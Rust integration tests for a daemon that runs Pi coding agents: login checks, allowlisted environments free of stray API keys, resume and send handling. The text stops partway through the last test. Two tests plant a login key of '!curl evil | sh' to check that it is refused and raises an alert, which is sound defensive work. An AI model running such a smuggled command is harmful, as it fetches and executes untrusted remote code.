//! Pi agents through the core, against the test backend with the stand-in for
//! Pi: a session file written as Pi's are and read through agent-tail's Pi
//! adapter, on a real shim. No model, no provider, no login. The real `pi` runs
//! in `pi_e2e.rs`, where there is one.

mod common;

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Once};

use common::{Golden, publish_pi, wait_until};
use serde_json::Value;
use vibe_core::model::{
    Activity, AgentKind, AgentState, CheckId, CheckState, Environment, MessageRole, Mode, PiTarget,
    StopReason,
};
use vibe_core::paths::Layout;
use vibe_core::rpc::{
    AgentDeleteParams, AgentMessagesParams, AgentStartParams, DoctorFixParams, ErrorCode,
    HostParams, PiInstallParams, ProfileCreateParams, ProfileUpdateParams, ProjectAddParams,
    ProjectParams,
};
use vibed::agents::Backends;
use vibed::core::Core;

/// `vibed`'s own environment, with what a shell or a launchd job might leave
/// in it. Set once, before any agent: this binary's tests are all about it.
static STRAY: Once = Once::new();

fn set_stray_keys() {
    STRAY.call_once(|| {
        // SAFETY: only here, before any test of this binary starts an agent;
        // nothing else in it reads or writes these.
        unsafe {
            std::env::set_var("OPENROUTER_API_KEY", "stray-openrouter");
            std::env::set_var("ANTHROPIC_API_KEY", "stray-anthropic");
            std::env::set_var("ANTHROPIC_OAUTH_TOKEN", "stray-oauth");
            std::env::set_var("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-stray");
        }
    });
}

struct World {
    golden: Golden,
    core: Arc<Core>,
    layout: Layout,
}

async fn world() -> World {
    world_with(|_| {}).await
}

async fn world_with(change: impl FnOnce(&mut vibed::core::Config)) -> World {
    set_stray_keys();
    let golden = Golden::new();
    let mut config = golden.config();
    change(&mut config);
    let core = Arc::new(Core::open(config).unwrap());
    let project = golden.home.join("src/app");
    core.add_project(ProjectAddParams {
        path: Some(project.to_str().unwrap().into()),
        ..Default::default()
    })
    .await
    .unwrap();
    core.create_profile(ProfileCreateParams {
        project: "app".into(),
        name: "pi-linux".into(),
        agent: Some(AgentKind::Pi),
        pi_model: Some("mock/mock-model".into()),
        ..Default::default()
    })
    .unwrap();
    World {
        layout: Layout::new(&golden.home, "macos"),
        golden,
        core,
    }
}

impl World {
    /// The owner has signed in: a login in the store.
    fn sign_in(&self) {
        let dir = self.layout.linux_pi_logins_dir();
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("auth.json"),
            r#"{"mock":{"type":"api_key","key":"fake"}}"#,
        )
        .unwrap();
    }

    /// A profile whose model's provider Pi names a key for, so it can be said to
    /// lack one. `mock` is like an extension's, which Pi is left to try.
    fn profile_for_a_provider_pi_knows(&self) {
        self.core
            .create_profile(ProfileCreateParams {
                project: "app".into(),
                name: "pi-known".into(),
                agent: Some(AgentKind::Pi),
                pi_model: Some("xai/grok".into()),
                ..Default::default()
            })
            .unwrap();
    }

    async fn start(&self, prompt: &str) -> vibe_core::rpc::Agent {
        self.core
            .start_agent(AgentStartParams {
                project: "app".into(),
                profile: "pi-linux".into(),
                prompt: prompt.into(),
                ..Default::default()
            })
            .await
            .unwrap()
    }

    /// `<dir>.args` or `<dir>.env` beside its sessions: what the stand-in was
    /// started with, last.
    fn started_with(&self, r: &str, what: &str) -> String {
        let path = self
            .layout
            .agent_dir(r)
            .join(format!("{}.{what}", vibe_env::pi::VM_SESSIONS));
        wait_until("the stand-in to start", || path.is_file());
        fs::read_to_string(path).unwrap()
    }

    fn sessions(&self, r: &str) -> PathBuf {
        self.layout.agent_dir(r).join(vibe_env::pi::VM_SESSIONS)
    }

    async fn state(&self, r: &str) -> (AgentState, Activity, Option<StopReason>) {
        let list = self.core.agents(HostParams { host: None }).await.unwrap();
        let a = list.agents.iter().find(|a| a.agent == r).unwrap();
        (a.state, a.status.activity, a.status.stop_reason)
    }

    async fn wait_for(&self, r: &str, activity: Activity) {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        loop {
            let (_, now, _) = self.state(r).await;
            if now == activity {
                return;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "{r} is {now}, not {activity}"
            );
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    /// Waits for `text` on its screen, which the socket's output call reads.
    async fn wait_screen(&self, r: &str, text: &str) {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        loop {
            let screen = self
                .core
                .agent_output(None, r, None)
                .await
                .map(|s| s.screen)
                .unwrap_or_default();
            if screen.contains(text) {
                return;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "no {text:?} on its screen:\n{screen}"
            );
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    async fn delete(&self, r: &str) {
        self.core
            .delete_agent(AgentDeleteParams {
                host: None,
                agent: r.into(),
                force: Some(true),
            })
            .await
            .unwrap();
    }
}

/// Files in `dir`, by name.
fn names(dir: &Path) -> Vec<String> {
    fs::read_dir(dir)
        .map(|d| {
            d.map(|e| e.unwrap().file_name().into_string().unwrap())
                .collect()
        })
        .unwrap_or_default()
}

#[tokio::test]
async fn not_signed_in_is_said_at_once_and_undone() {
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-known".into(),
            prompt: "hello".into(),
            name: Some("no-login".into()),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert_eq!(e.code, ErrorCode::Conflict.code());
    assert!(e.message.contains("Settings → Agents"), "{}", e.message);
    // What the app offers that sign-in from.
    let offer = &e.data.as_ref().unwrap()["pi_sign_in"];
    assert_eq!(offer["provider"], "xai");
    assert!(offer["target"].is_string());
    // Nothing of it is left behind: no record, worktree or branch.
    assert!(
        w.core
            .agents(HostParams { host: None })
            .await
            .unwrap()
            .agents
            .is_empty()
    );
    assert!(!w.layout.worktree("app", "no-login").exists());
    assert_eq!(
        common::git_out(
            &w.golden.home.join("src/app"),
            &["branch", "--list", "no-login"]
        ),
        ""
    );
}

#[tokio::test]
async fn a_provider_of_the_owners_own_with_a_key_counts_as_signed_in() {
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let dir = w.layout.linux_pi_dir();
    fs::create_dir_all(&dir).unwrap();
    fs::write(
        dir.join("models.json"),
        r#"{"providers":{"xai":{"apiKey":"k"}}}"#,
    )
    .unwrap();
    let a = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-known".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap();
    w.delete(&a.agent).await;
}

/// What used to be let through only to read as busy for ever.
#[tokio::test]
async fn what_cant_answer_for_this_model_is_refused() {
    use std::os::unix::fs::PermissionsExt;
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let dir = w.layout.linux_pi_logins_dir();
    fs::create_dir_all(&dir).unwrap();
    let refused = |w_core: Arc<Core>| async move {
        w_core
            .start_agent(AgentStartParams {
                project: "app".into(),
                profile: "pi-known".into(),
                prompt: "hello".into(),
                ..Default::default()
            })
            .await
            .unwrap_err()
    };
    // A login, for another provider than the profile's model.
    fs::write(
        dir.join("auth.json"),
        r#"{"openai":{"type":"oauth","access":"a","refresh":"r","expires":9}}"#,
    )
    .unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert_eq!(e.code, ErrorCode::Conflict.code());
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
    assert!(e.message.contains("Settings → Agents"), "{}", e.message);
    fs::write(dir.join("auth.json"), "{}").unwrap();
    // An unrelated line of pi.env.
    let file = w.layout.pi_env_file();
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "EDITOR_THEME=dark\n").unwrap();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
    // A models.json with nothing in it.
    let config = w.layout.linux_pi_dir();
    fs::create_dir_all(&config).unwrap();
    fs::write(config.join("models.json"), "{}").unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
}

/// N6: a provider Pi names no key for is an extension's or the owner's, and only
/// trying says whether it can answer.
#[tokio::test]
async fn a_provider_pi_doesnt_know_is_left_to_try() {
    let w = world().await;
    let a = w.start("hello").await;
    w.wait_for(&a.agent, Activity::Done).await;
    w.delete(&a.agent).await;
}

/// Pi throws before it writes anything and says so only on its screen, in what
/// no check before the start can catch: an expired login, say.
#[tokio::test]
async fn a_turn_that_fails_before_it_starts_shows_as_an_error() {
    let w = world().await;
    w.sign_in();
    let a = w.start("nologin").await;
    let r = a.agent.clone();
    assert_eq!(names(&w.sessions(&r)).len(), 0, "nothing on disk");
    w.wait_for(&r, Activity::Errored).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Idle);
    let agents = w
        .core
        .agents(HostParams { host: None })
        .await
        .unwrap()
        .agents;
    let error = agents[0].status.error.as_deref();
    assert_eq!(error, Some("No API key found for mock."));
    // Signed in again and told to go on, it does.
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

#[tokio::test]
async fn a_prompt_starting_with_at_reaches_pi_as_a_prompt() {
    let w = world().await;
    w.sign_in();
    let a = w.start("@src/main.rs fix this").await;
    let args = w.started_with(&a.agent, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(args[args.len() - 2..], ["--", " @src/main.rs fix this"]);
    w.wait_for(&a.agent, Activity::Done).await;
    w.delete(&a.agent).await;
}

/// `.vibe/setup.sh` for a Pi agent starts from the same allowlist Pi does.
#[tokio::test]
async fn a_pi_agents_setup_gets_no_stray_key() {
    let w = world().await;
    w.sign_in();
    let clone = w.golden.home.join("src/app");
    let repo = PathBuf::from(common::git_out(&clone, &["remote", "get-url", "origin"]));
    fs::create_dir_all(repo.join(".vibe")).unwrap();
    let seen = w.golden.home.join("setup-env");
    fs::write(
        repo.join(".vibe/setup.sh"),
        format!("env > {}\n", seen.display()),
    )
    .unwrap();
    common::git_out(&repo, &["add", ".vibe"]);
    common::git_out(&repo, &["commit", "-qm", "setup"]);
    let a = w.start("hello").await;
    let env = fs::read_to_string(&seen).unwrap();
    assert!(env.contains("GIT_CONFIG_COUNT="), "{env}");
    assert!(!env.contains("stray-"), "{env}");
    assert!(!env.contains("CLAUDE_CODE_OAUTH_TOKEN"), "{env}");
    w.delete(&a.agent).await;
}

/// A start, in full: what Pi is started with, its status, its answer, and its
/// environment, built from the allowlist.
#[tokio::test]
async fn a_pi_agent_starts_on_its_prompt_and_no_stray_key_reaches_it() {
    let w = world().await;
    w.sign_in();
    let a = w.start("-say hello").await;
    assert_eq!(a.kind, AgentKind::Pi);
    let r = a.agent.clone();
    assert_eq!(
        serde_json::to_value(&a).unwrap()["agent"],
        "pi",
        "the socket says which"
    );

    // Its arguments: one flag for the session, the prompt after `--`.
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(
        args,
        [
            "--session-id",
            a.session_id.as_str(),
            "--model",
            "mock/mock-model",
            "--thinking",
            "high",
            "--approve",
            "--",
            "-say hello"
        ]
    );

    // Its environment.
    let env = w.started_with(&r, "env");
    for stray in [
        "OPENROUTER_API_KEY",
        "ANTHROPIC_API_KEY",
        "ANTHROPIC_OAUTH_TOKEN",
        "CLAUDE_CODE_OAUTH_TOKEN",
    ] {
        assert!(
            !env.lines().any(|l| l.starts_with(&format!("{stray}="))),
            "{stray} reached Pi:\n{env}"
        );
    }
    assert!(!env.contains("sk-ant-oat01"), "{env}");
    assert!(!env.contains("stray-"), "{env}");
    for wanted in [
        "PI_SKIP_VERSION_CHECK=1",
        "PI_TELEMETRY=0",
        "GIT_CONFIG_COUNT=3",
    ] {
        assert!(env.lines().any(|l| l == wanted), "{wanted}:\n{env}");
    }
    assert!(env.contains("PI_CODING_AGENT_SESSION_DIR="), "{env}");
    // Its worktree's session, in its own directory, named as Pi names it.
    w.wait_for(&r, Activity::Done).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Idle);
    let files = names(&w.sessions(&r));
    assert_eq!(files.len(), 1, "{files:?}");
    assert!(
        files[0].ends_with(&format!("_{}.jsonl", a.session_id)),
        "{files:?}"
    );

    // Its conversation, through the same call as Claude's.
    let messages = w.core.agent_messages(None, &r, 10).await.unwrap();
    assert_eq!(
        messages
            .iter()
            .map(|m| (m.role, m.text.as_str()))
            .collect::<Vec<_>>(),
        [
            (MessageRole::User, "-say hello"),
            (MessageRole::Assistant, "Working on: -say hello"),
        ]
    );
    let via_rpc = w
        .core
        .messages_call(AgentMessagesParams {
            agent: r.clone(),
            last: Some(1),
            ..Default::default()
        })
        .await
        .unwrap();
    assert_eq!(via_rpc.messages.len(), 1);

    // And it's on its screen, which the socket's output call reads.
    w.wait_screen(&r, "Working on: -say hello").await;
    w.delete(&r).await;
}

/// What the owner set on purpose in `pi.env` is the one way in.
#[tokio::test]
async fn keys_set_on_purpose_reach_it() {
    use std::os::unix::fs::PermissionsExt;
    let w = world().await;
    let file = w.layout.pi_env_file();
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "OPENROUTER_API_KEY=on-purpose\n").unwrap();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
    w.sign_in();
    let a = w.start("hello").await;
    let env = w.started_with(&a.agent, "env");
    assert!(
        env.lines().any(|l| l == "OPENROUTER_API_KEY=on-purpose"),
        "{env}"
    );
    assert!(!env.contains("stray-"), "{env}");
    w.delete(&a.agent).await;

    // The Claude token can't be set that way. The start says why.
    fs::write(&file, "CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-x\n").unwrap();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("can't be set"), "{}", e.message);
}

/// Busy on a long, silent tool: never a question, whatever the wait.
#[tokio::test]
async fn a_long_tool_never_raises_a_hand() {
    let w = world().await;
    w.sign_in();
    let a = w.start("tool 3").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::RunningTool).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy);
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(!check.answered, "still at it");
    w.wait_for(&r, Activity::Done).await;
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(check.answered);
    assert_eq!(check.state, AgentState::Idle);
    w.delete(&r).await;
}

#[tokio::test]
async fn thinking_has_its_prompt_on_disk_and_is_busy() {
    let w = world().await;
    w.sign_in();
    let a = w.start("think 4").await;
    let r = a.agent.clone();
    // Pi writes its file at the first user message, not its first answer.
    wait_until("its file", || names(&w.sessions(&r)).len() == 1);
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy);
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

#[tokio::test]
async fn usage_limits_and_errors_are_shown() {
    let w = world().await;
    w.sign_in();
    let a = w.start("limit").await;
    w.wait_for(&a.agent, Activity::Errored).await;
    let (state, _, stop) = w.state(&a.agent).await;
    assert_eq!(state, AgentState::Idle);
    assert_eq!(stop, Some(StopReason::UsageLimit));
    w.delete(&a.agent).await;

    let a = w.start("error").await;
    w.wait_for(&a.agent, Activity::Errored).await;
    let (state, _, stop) = w.state(&a.agent).await;
    assert_eq!((state, stop), (AgentState::Idle, None));
    w.delete(&a.agent).await;
}

/// A send wakes one that exited, on the same session id: the same file goes on.
#[tokio::test]
async fn a_request_id_reaches_a_pi_agent_once_as_it_does_any_agent() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    let input = || vibe_mcp::Input::Text {
        text: "only once".into(),
        submit: true,
        force: false,
    };
    w.core.send_once(None, &r, input(), "first").await.unwrap();
    w.wait_screen(&r, "Working on: only once").await;
    w.wait_for(&r, Activity::Done).await;
    // The caller never heard, and makes it again: nothing more is typed.
    w.core.send_once(None, &r, input(), "first").await.unwrap();
    // Used for something else, it's refused.
    let other = vibe_mcp::Input::Text {
        text: "something else".into(),
        submit: true,
        force: false,
    };
    let refused = w
        .core
        .send_once(None, &r, other, "first")
        .await
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::Conflict.code(), "{refused:?}");
    let messages = w.core.agent_messages(None, &r, 20).await.unwrap();
    let times = messages.iter().filter(|m| m.text == "only once").count();
    assert_eq!(times, 1, "{messages:?}");
    w.delete(&r).await;
}

#[tokio::test]
async fn a_resume_goes_on_with_the_same_session() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    let before = names(&w.sessions(&r));
    assert_eq!(before.len(), 1);

    // Its processes go, as after a reboot.
    let socket = w.layout.session_socket(&r);
    let vibed::sessions::Probe::Running(session) = vibed::sessions::probe(&socket).await else {
        panic!("its session runs");
    };
    vibe_env::tree::SessionTree::new(session.pid).end(std::time::Duration::from_secs(5));
    wait_until("it to exit", || !socket.exists());
    w.core.resume_agent(None, &r).await.unwrap();
    w.wait_screen(&r, &format!("Resumed {}", a.session_id))
        .await;
    // The same id, and no prompt to run again.
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(args[..2], ["--session-id", a.session_id.as_str()]);
    assert!(!args.contains(&"--"), "{args:?}");

    let sent = w
        .core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    assert!(!sent.woke);
    w.wait_screen(&r, "Working on: and again").await;
    assert_eq!(names(&w.sessions(&r)), before, "the same file, appended to");
    w.wait_for(&r, Activity::Done).await;
    let messages = w.core.agent_messages(None, &r, 10).await.unwrap();
    assert_eq!(messages.len(), 4, "{messages:?}");
    w.delete(&r).await;
}

/// Its processes go, as after a reboot.
async fn end_its_session(w: &World, r: &str) {
    let socket = w.layout.session_socket(r);
    let vibed::sessions::Probe::Running(session) = vibed::sessions::probe(&socket).await else {
        panic!("its session runs");
    };
    vibe_env::tree::SessionTree::new(session.pid).end(std::time::Duration::from_secs(5));
    wait_until("it to exit", || !socket.exists());
}

/// Pi writes nothing on a resume, so what its transcript left open stays open
/// there. It's over, or it would read as busy for ever.
#[tokio::test]
async fn a_turn_left_open_before_a_resume_is_over() {
    let w = world().await;
    w.sign_in();
    for prompt in ["tool 3600", "think 3600"] {
        let a = w.start(prompt).await;
        let r = a.agent.clone();
        wait_until("its file", || names(&w.sessions(&r)).len() == 1);
        let (state, _, _) = w.state(&r).await;
        assert_eq!(state, AgentState::Busy, "{prompt}");
        end_its_session(&w, &r).await;
        w.core.resume_agent(None, &r).await.unwrap();
        w.wait_for(&r, Activity::Interrupted).await;
        let (state, _, _) = w.state(&r).await;
        assert_eq!(state, AgentState::Idle, "{prompt}");
        // And what comes next counts as usual.
        w.core
            .send_input(
                None,
                &r,
                vibe_mcp::Input::Text {
                    text: "and again".into(),
                    submit: true,
                    force: false,
                },
            )
            .await
            .unwrap();
        w.wait_for(&r, Activity::Done).await;
        w.delete(&r).await;
    }
    // One only ever told one of Pi's own commands has nothing to go back to: it's
    // simply at rest, and that command isn't done again.
    for prompt in ["/model", "!touch ran-again"] {
        let a = w.start(prompt).await;
        w.started_with(&a.agent, "args");
        end_its_session(&w, &a.agent).await;
        fs::remove_file(args_file(&w, &a.agent)).unwrap();
        w.core.resume_agent(None, &a.agent).await.unwrap();
        let args = w.started_with(&a.agent, "args");
        assert!(!args.lines().any(|l| l == "--"), "{prompt}: {args}");
        w.wait_for(&a.agent, Activity::Done).await;
        w.delete(&a.agent).await;
    }
}

fn args_file(w: &World, r: &str) -> PathBuf {
    w.layout
        .agent_dir(r)
        .join(format!("{}.args", vibe_env::pi::VM_SESSIONS))
}

/// Dead before its first message, as with no login yet, it has no transcript and no
/// answer: it comes back on what it was asked. Once it's written, that's not asked again.
#[tokio::test]
async fn a_restart_before_its_first_message_has_its_prompt() {
    let w = world().await;
    w.sign_in();
    let a = w.start("nologin").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Errored).await;
    end_its_session(&w, &r).await;
    fs::remove_file(args_file(&w, &r)).unwrap();
    w.core.resume_agent(None, &r).await.unwrap();
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(args[..2], ["--session-id", a.session_id.as_str()]);
    assert!(args.ends_with(&["--", "nologin"]), "{args:?}");
    // It's on the prompt, so it isn't the rest a resume with nothing to do is.
    w.wait_for(&r, Activity::Errored).await;
    w.delete(&r).await;

    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    assert!(!w.layout.agent_dir(&r).join("start-prompt").exists());
    end_its_session(&w, &r).await;
    fs::remove_file(args_file(&w, &r)).unwrap();
    w.core.resume_agent(None, &r).await.unwrap();
    let args = w.started_with(&r, "args");
    assert!(!args.lines().any(|l| l == "--"), "{args}");
    w.delete(&r).await;
}

/// The toolbox's `/login` lands in its own copy; `vibed` takes it to the store and
/// gives it to every agent's, and Settings hears, without being asked.
#[tokio::test]
async fn a_toolbox_login_reaches_every_agent_and_says_so() {
    let w = world().await;
    let (_, mut events) = w.core.subscribe();
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let signin = w.layout.linux_pi_signin_dir();
    fs::create_dir_all(&signin).unwrap();
    fs::write(
        signin.join("auth.json"),
        r#"{"mock":{"type":"oauth","access":"a","refresh":"r","expires":9}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let store = w.layout.linux_pi_logins_dir();
    assert_eq!(vibe_env::pi::logins_in(&store), ["mock"]);
    let event = events.try_recv().unwrap();
    assert_eq!(event.kind, vibe_core::model::EventKind::PiChanged);
    assert_eq!(event.message, None);
    // It stays there too, as that's the toolbox's own Pi's login.
    assert_eq!(vibe_env::pi::logins_in(&signin), ["mock"]);
    // So an agent can start on it, and has its own copy.
    let a = w.start("hello").await;
    let copy = w
        .layout
        .agent_dir(&a.agent)
        .join(vibe_env::pi::VM_AGENT_DIR);
    assert_eq!(vibe_env::pi::logins_in(&copy), ["mock"]);
    w.delete(&a.agent).await;
}

/// D1: what one VM does to its copy stays there; every other carries on, and the
/// owner hears which, through Settings as well as the event.
#[tokio::test]
async fn a_copy_gone_bad_is_an_alert_for_that_agent_alone() {
    let w = world().await;
    w.sign_in();
    let (bad, good) = (w.start("one").await.agent, w.start("two").await.agent);
    w.wait_for(&bad, Activity::Done).await;
    w.wait_for(&good, Activity::Done).await;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = |r: &str| w.layout.agent_dir(r).join(vibe_env::pi::VM_AGENT_DIR);

    let (_, mut events) = w.core.subscribe();
    fs::write(
        copy(&bad).join("auth.json"),
        r#"{"x":1e999,"openai":{"type":"api_key","key":"!curl evil | sh"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let event = events.try_recv().unwrap();
    assert_eq!(event.kind, vibe_core::model::EventKind::PiChanged);
    let said = event.message.unwrap();
    assert!(said.contains(&bad), "{said}");
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let vms = status.vms.unwrap();
    assert_eq!(vms.alerts.len(), 1);
    assert!(vms.alerts[0].contains(&bad), "{:?}", vms.alerts);
    assert!(!vms.alerts[0].contains(&good), "{:?}", vms.alerts);
    // Nothing of it reached the store or the other agent, and no secret is told.
    assert_eq!(vms.logins, ["mock"]);
    assert_eq!(vibe_env::pi::logins_in(&copy(&good)), ["mock"]);
    assert!(!said.contains("curl"), "{said}");
    // It isn't said twice, and the other agent still gets what's new.
    fs::write(
        w.layout.linux_pi_logins_dir().join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"newer"}}"#,
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    assert!(events.try_recv().is_err());
    let text = fs::read_to_string(copy(&good).join("auth.json")).unwrap();
    assert!(text.contains("newer"), "{text}");

    // Put right, the alert goes, and Settings hears that too.
    fs::write(copy(&bad).join("auth.json"), "{}").unwrap();
    w.core.pi_watch(&mut seen).await;
    assert_eq!(events.try_recv().unwrap().message, None);
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    assert!(status.vms.unwrap().alerts.is_empty());
    w.delete(&bad).await;
    w.delete(&good).await;
}

/// A first sign-in from inside an agent reaches the others, and can't be told
/// from a hostile one, so the owner is told.
#[tokio::test]
async fn a_first_sign_in_in_an_agent_is_told_to_the_owner() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&a).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy.join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},"xai":{"type":"api_key","key":"k"}}"#,
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let said = events.try_recv().unwrap().message.unwrap();
    assert!(said.contains(&a) && said.contains("xai"), "{said}");
    assert!(said.contains("Settings → Agents"), "{said}");
    assert_eq!(
        vibe_env::pi::logins_in(&w.layout.linux_pi_logins_dir()),
        ["mock", "xai"]
    );
    w.delete(&a).await;
}

/// A real Pi can have its editor up and bracketed paste on while its startup goes
/// on, and until then hands back what's submitted, saying so. This does that as
/// the pinned Pi does, for its first 2 s.
const PI_STILL_STARTING: &str = r#"#!/usr/bin/env python3
import os, sys, time, tty
got = sys.argv[0] + ".got"
tty.setraw(0)
rule = "\u2500" * 40
begun = time.time()
buf = ""
def draw(note):
    sys.stdout.write("\r\n%s\r\n\r\n%s\r\n%s\r\n\r\n%s\r\n" % (note, rule, buf, rule))
    sys.stdout.flush()
sys.stdout.write("\x1b[?2004h")
draw("")
while True:
    data = os.read(0, 4096).decode().replace("\x1b[200~", "").replace("\x1b[201~", "")
    for c in data:
        if c != "\r":
            buf += c
        elif time.time() - begun < 2:
            draw("Startup is still in progress")
        elif buf:
            with open(got, "a") as f:
                f.write(buf + "\n")
            buf = ""
            draw("")
"#;

/// A send just after a start reaches a Pi still starting: it's pressed again until
/// it's taken, once.
#[tokio::test(flavor = "multi_thread")]
async fn a_send_to_a_pi_still_starting_is_taken_in_the_end() {
    let w = world().await;
    w.sign_in();
    let pi = w.golden.claude.with_file_name("pi");
    common::write_script(&pi, PI_STILL_STARTING);
    let got = pi.with_file_name("pi.got");
    let a = w.start("hello").await;
    let begun = std::time::Instant::now();
    w.core
        .send_input(
            None,
            &a.agent,
            vibe_mcp::Input::Text {
                text: "after a start".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    let got_it = begun.elapsed();
    assert_eq!(fs::read_to_string(&got).unwrap(), "after a start\n");
    assert!(got_it < std::time::Duration::from_secs(30), "{got_it:?}");
    w.delete(&a.agent).await;
}

/// A Pi too slow for a send's wait refuses it, and is still starting when its editor
/// comes up: the send made once it has is pressed again until it's taken, as the
/// first would have been.
#[tokio::test(flavor = "multi_thread")]
async fn a_send_after_a_pi_was_too_slow_for_the_wait_is_taken_in_the_end() {
    let w = world().await;
    w.sign_in();
    let pi = w.golden.claude.with_file_name("pi");
    common::write_script(
        &pi,
        &PI_STILL_STARTING.replace("begun = time.time()", "time.sleep(31)\nbegun = time.time()"),
    );
    let got = pi.with_file_name("pi.got");
    let a = w.start("hello").await;
    let input = || vibe_mcp::Input::Text {
        text: "after a start".into(),
        submit: true,
        force: false,
    };
    let e = w
        .core
        .send_input(None, &a.agent, input())
        .await
        .unwrap_err();
    assert!(e.message.contains("nothing was sent"), "{e:?}");
    w.wait_screen(&a.agent, "\u{2500}\u{2500}\u{2500}").await;
    w.core.send_input(None, &a.agent, input()).await.unwrap();
    assert_eq!(fs::read_to_string(&got).unwrap(), "after a start\n");
    w.delete(&a.agent).await;
}

/// B1: a login Pi really writes, beside a bad one, in the same file: the good one
/// goes on, the bad one doesn't, and the owner hears which.
#[tokio::test]
async fn a_bad_login_beside_a_good_one_is_told_of_by_provider() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy.join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},
            "xai":{"type":"api_key","key":"k"},
            "openai":{"type":"api_key","key":"!curl evil | sh"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let vms = status.vms.unwrap();
    assert_eq!(vms.logins, ["mock", "xai"]);
    let alerts = vms.alerts.join("\n");
    // Each said once, the refused one first, as `linux_vm.rs` holds real VMs to.
    assert_eq!(vms.alerts.len(), 2, "{alerts}");
    assert!(
        vms.alerts[0].contains("login for openai would run a command"),
        "{alerts}"
    );
    assert!(vms.alerts[1].contains("signed in to xai"), "{alerts}");
    assert!(!alerts.contains("curl"), "{alerts}");
    w.delete(&r).await;
}

/// B3: logins aren't kept in step for an agent asleep, and agents sleep within a
/// minute. It has to wake on what's current, by the time a send has typed to it.
#[tokio::test]
async fn a_woken_agent_is_on_the_login_of_now() {
    let w = world().await;
    let auth = |token: &str| {
        format!(
            r#"{{"mock":{{"type":"oauth","refresh":"{token}","access":"a","expires":1800000900000}}}}"#
        )
    };
    let signin = w.layout.linux_pi_signin_dir();
    fs::create_dir_all(&signin).unwrap();
    let mut seen = None;
